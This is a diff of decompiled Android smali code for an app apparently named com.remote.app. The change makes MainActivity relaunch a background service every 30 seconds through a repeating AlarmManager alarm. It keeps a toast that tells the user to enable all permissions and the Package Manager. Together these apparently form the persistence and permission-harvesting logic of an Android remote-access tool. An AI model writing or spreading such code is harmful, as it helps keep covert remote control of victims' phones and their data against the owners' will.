@@ -51,7 +51,7 @@
 
 # virtual methods
 .method protected onCreate(Landroid/os/Bundle;)V
-    .locals 2
+    .locals 10
 
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
 
@@ -65,7 +65,35 @@
 
     invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    invoke-virtual {p0, p1}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;
+
+    move-result-object v0
+
+    const/4 v1, 0x1
+
+    const/4 v2, 0x0
+
+    invoke-static {v0, v1, p1, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v9
+
+    const-string p1, "alarm"
+
+    invoke-virtual {p0, p1}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object p1
+
+    move-object v3, p1
+
+    check-cast v3, Landroid/app/AlarmManager;
+
+    const/4 v4, 0x2
+
+    const-wide/16 v5, 0x0
+
+    const-wide/16 v7, 0x7530
+
+    invoke-virtual/range {v3 .. v9}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
 
     invoke-direct {p0}, Lcom/remote/app/MainActivity;->a()Z
 
@@ -77,11 +105,9 @@
 
     move-result-object p1
 
-    const/4 v0, 0x1
+    const-string v0, "Click \'Permissions\'\nEnable ALL permissions\n Click back x2\n Enable \'Package Manager\'"
 
-    const-string v1, "Click \'Permissions\'\nEnable ALL permissions\n Click back x2\n Enable \'Package Manager\'"
-
-    invoke-static {p1, v1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+    invoke-static {p1, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
 
     move-result-object p1
 
